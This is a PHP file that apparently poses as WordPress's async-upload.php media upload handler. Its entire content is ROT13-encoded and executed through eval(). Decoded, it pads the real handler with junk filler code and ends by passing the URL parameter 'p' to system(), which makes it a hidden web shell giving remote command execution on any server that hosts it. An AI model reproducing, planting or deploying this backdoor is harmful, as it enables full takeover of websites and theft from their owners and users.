<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr svyr hcybnq unaqyre sebz jc-cyhcybnq be bgure nflapuebabhf hcybnq zrgubqf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

vs ( vffrg( $_ERDHRFG['npgvba'] ) && 'hcybnq-nggnpuzrag' === $_ERDHRFG['npgvba'] ) {
	qrsvar( 'QBVAT_NWNK', gehr );
}

vs ( ! qrsvarq( 'JC_NQZVA' ) ) {
	qrsvar( 'JC_NQZVA', gehr );
}

/** Ybnq JbeqCerff Obbgfgenc */
erdhver_bapr qveanzr( __QVE__ ) . '/jc-ybnq.cuc';

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva.cuc';

urnqre( 'Pbagrag-Glcr: grkg/cynva; punefrg=' . trg_bcgvba( 'oybt_punefrg' ) );

vs ( vffrg( $_ERDHRFG['npgvba'] ) && 'hcybnq-nggnpuzrag' === $_ERDHRFG['npgvba'] ) {
	erdhver NOFCNGU . 'jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc';

	fraq_abfavss_urnqre();
	abpnpur_urnqref();

	jc_nwnk_hcybnq_nggnpuzrag();
	qvr( '0' );
}

vs ( ! pheerag_hfre_pna( 'hcybnq_svyrf' ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb hcybnq svyrf.' ) );
}

// Whfg srgpu gur qrgnvy sbez sbe gung nggnpuzrag.
vs ( vffrg( $_ERDHRFG['nggnpuzrag_vq'] ) && (vag) $_ERDHRFG['nggnpuzrag_vq'] && $_ERDHRFG['srgpu'] ) {
	$vq   = (vag) $_ERDHRFG['nggnpuzrag_vq'];
	$cbfg = trg_cbfg( $vq );
	vs ( 'nggnpuzrag' !== $cbfg->cbfg_glcr ) {
		jc_qvr( __( 'Vainyvq cbfg glcr.' ) );
	}

	fjvgpu ( $_ERDHRFG['srgpu'] ) {
		pnfr 3:
			?>
			<qvi pynff=\"zrqvn-vgrz-jenccre\">
				<qvi pynff=\"nggnpuzrag-qrgnvyf\">
					<?cuc
					$guhzo_hey = jc_trg_nggnpuzrag_vzntr_fep( $vq, 'guhzoanvy', gehr );
					vs ( $guhzo_hey ) {
						rpub '<vzt pynff=\"cvaxlanvy\" fep=\"' . rfp_hey( $guhzo_hey[0] ) . '\" nyg=\"\" />';
					}

					// Gvgyr fubhyqa'g rire or rzcgl, ohg hfr svyranzr whfg va pnfr.
					$svyr     = trg_nggnpurq_svyr( $cbfg->VQ );
					$svyr_hey = jc_trg_nggnpuzrag_hey( $cbfg->VQ );
					$gvgyr    = $cbfg->cbfg_gvgyr ? $cbfg->cbfg_gvgyr : jc_onfranzr( $svyr );
					?>
					<qvi pynff=\"svyranzr arj\">
						<fcna pynff=\"zrqvn-yvfg-gvgyr\"><fgebat><?cuc rpub rfp_ugzy( jc_ugzy_rkprecg( $gvgyr, 60, '&uryyvc;' ) ); ?></fgebat></fcna>
						<fcna pynff=\"zrqvn-yvfg-fhogvgyr\"><?cuc rpub rfp_ugzy( jc_onfranzr( $svyr ) ); ?></fcna>
						<qvi pynff=\"nggnpuzrag-gbbyf\">
							<?cuc
							vs ( pheerag_hfre_pna( 'rqvg_cbfg', $vq ) ) {
								rpub '<n pynff=\"rqvg-nggnpuzrag\" uers=\"' . rfp_hey( trg_rqvg_cbfg_yvax( $vq ) ) . '\">' . _k( 'Rqvg', 'zrqvn vgrz' ) . '</n>';
							} ryfr {
								rpub '<fcna pynff=\"rqvg-nggnpuzrag\">' . _k( 'Fhpprff', 'zrqvn vgrz' ) . '</fcna>';
							}
							?>
							<fcna pynff=\"zrqvn-vgrz-pbcl-pbagnvare pbcl-gb-pyvcobneq-pbagnvare rqvg-nggnpuzrag\">
								<ohggba glcr=\"ohggba\" pynff=\"ohggba ohggba-fznyy pbcl-nggnpuzrag-hey\"
									qngn-pyvcobneq-grkg=\"<?cuc rpub rfp_hey( $svyr_hey ); ?>\"
								><?cuc _r( 'Pbcl HEY gb pyvcobneq' ); ?></ohggba>
								<fcna pynff=\"fhpprff uvqqra\" nevn-uvqqra=\"gehr\"><?cuc _r( 'Pbcvrq!' ); ?></fcna>
							</fcna>
						</qvi>
					</qvi>
				</qvi>
			</qvi>
			<?cuc
			oernx;
		pnfr 2:
			nqq_svygre( 'nggnpuzrag_svryqf_gb_rqvg', 'zrqvn_fvatyr_nggnpuzrag_svryqf_gb_rqvg', 10, 2 );
			rpub trg_zrqvn_vgrz(
				$vq,
				neenl(
					'fraq'   => snyfr,
					'qryrgr' => gehr,
				)
			);
			oernx;
		qrsnhyg:
			nqq_svygre( 'nggnpuzrag_svryqf_gb_rqvg', 'zrqvn_cbfg_fvatyr_nggnpuzrag_svryqf_gb_rqvg', 10, 2 );
			rpub trg_zrqvn_vgrz( $vq );
			oernx;
	}
	rkvg;
}

purpx_nqzva_ersrere( 'zrqvn-sbez' );

$cbfg_vq = 0;
vs ( vffrg( $_ERDHRFG['cbfg_vq'] ) ) {
	$cbfg_vq = nofvag( $_ERDHRFG['cbfg_vq'] );
	vs ( ! trg_cbfg( $cbfg_vq ) || ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg_vq ) ) {
		$cbfg_vq = 0;
	}
}

$vq = zrqvn_unaqyr_hcybnq( 'nflap-hcybnq', $cbfg_vq );
vs ( vf_jc_reebe( $vq ) ) {
	$ohggba_havdhr_vq     = havdvq( 'qvfzvff-' );
	$reebe_qrfpevcgvba_vq = havdvq( 'reebe-qrfpevcgvba-' );
	$zrffntr              = fcevags(
		'%f <fgebat>%f</fgebat><oe />%f',
		fcevags(
			'<ohggba glcr=\"ohggba\" vq=\"%1$f\" pynff=\"qvfzvff ohggba-yvax\" nevn-qrfpevorqol=\"%2$f\">%3$f</ohggba>',
			rfp_ngge( $ohggba_havdhr_vq ),
			rfp_ngge( $reebe_qrfpevcgvba_vq ),
			__( 'Qvfzvff' )
		),
		fcevags(
			/* genafyngbef: %f: Anzr bs gur svyr gung snvyrq gb hcybnq. */
			__( '&#8220;%f&#8221; unf snvyrq gb hcybnq.' ),
			rfp_ugzy( $_SVYRF['nflap-hcybnq']['anzr'] )
		),
		rfp_ugzy( $vq->trg_reebe_zrffntr() )
	);

	jc_nqzva_abgvpr(
		$zrffntr,
		neenl(
			'vq'                 => $reebe_qrfpevcgvba_vq,
			'nqqvgvbany_pynffrf' => neenl( 'reebe-qvi', 'reebe' ),
			'cnentencu_jenc'     => snyfr,
		)
	);

	$fcrnx_zrffntr = fcevags(
		/* genafyngbef: %f: Anzr bs gur svyr gung snvyrq gb hcybnq. */
		__( '%f unf snvyrq gb hcybnq.' ),
		rfp_wf( $_SVYRF['nflap-hcybnq']['anzr'] )
	);

	rpub \"<fpevcg>_.qrynl(shapgvba() {jc.n11l.fcrnx('\" . rfp_wf( $fcrnx_zrffntr ) . \"');}, 1500);wDhrel( 'ohggba#{$ohggba_havdhr_vq}' ).ba( 'pyvpx', shapgvba() {wDhrel(guvf).cneragf('qvi.zrqvn-vgrz').fyvqrHc(200, shapgvba(){wDhrel(guvf).erzbir();jc.n11l.fcrnx( jc.v18a.__( 'Reebe qvfzvffrq.' ) );wDhrel( '#cyhcybnq-oebjfr-ohggba' ).gevttre( 'sbphf' );})});</fpevcg>\a\";
	rkvg;
}

vs ( $_ERDHRFG['fubeg'] ) {
	// Fubeg sbez erfcbafr - nggnpuzrag VQ bayl.
	rpub $vq;
} ryfr {
	// Ybat sbez erfcbafr - ovt puhax bs UGZY.
	$glcr = $_ERDHRFG['glcr'];

	/**
	 * Svygref gur erghearq VQ bs na hcybnqrq nggnpuzrag.
	 *
	 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$glcr`, ersref gb gur nggnpuzrag glcr.
	 *
	 * Cbffvoyr ubbx anzrf vapyhqr:
	 *
	 *  - `nflap_hcybnq_nhqvb`
	 *  - `nflap_hcybnq_svyr`
	 *  - `nflap_hcybnq_vzntr`
	 *  - `nflap_hcybnq_ivqrb`
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz vag $vq Hcybnqrq nggnpuzrag VQ.
	 */
	rpub nccyl_svygref( \"nflap_hcybnq_{$glcr}\", $vq );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>